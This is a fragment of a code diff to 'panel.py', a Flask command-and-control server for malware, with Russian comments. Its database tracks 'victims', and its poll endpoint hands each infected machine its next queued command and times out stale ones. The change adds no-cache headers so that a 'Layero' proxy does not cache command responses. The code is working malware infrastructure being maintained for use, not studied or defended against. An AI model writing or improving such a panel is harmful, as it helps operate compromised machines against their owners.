@@ -1,6 +1,6 @@
 # language: Python 3.11+, file: panel.py
 import os, sqlite3, time, secrets, uuid
-from flask import Flask, request, g, Response, redirect, render_template_string, send_from_directory
+from flask import Flask, request, g, Response, redirect, render_template_string, send_from_directory, jsonify
 
 API_TOKEN  = os.environ.get("PANEL_TOKEN", "change-me")
 ADMIN_USER = os.environ.get("PANEL_USER", "admin")
@@ -79,13 +79,15 @@ def poll():
     now = int(time.time())
     with db() as c:
         c.execute("UPDATE victims SET last_seen=? WHERE id=?", (now, vid))
-        # Сбрасываем зависшие команды (висят больше 10 минут)
         c.execute("UPDATE commands SET result='[timeout]', finished=1 WHERE victim_id=? AND finished=0 AND issued < ?",
                   (vid, now - 600))
-                  
         row = c.execute("SELECT id,cmd FROM commands WHERE victim_id=? AND finished=0 ORDER BY id LIMIT 1",
                         (vid,)).fetchone()
-    return {"id": row["id"], "cmd": row["cmd"]} if row else {"id": 0, "cmd": None}
+    
+    # Защита от кеширования прокси Layero
+    resp = jsonify({"id": row["id"], "cmd": row["cmd"]} if row else {"id": 0, "cmd": None})
+    resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
+    return resp
 
 @app.post("/api/result")
 def result():
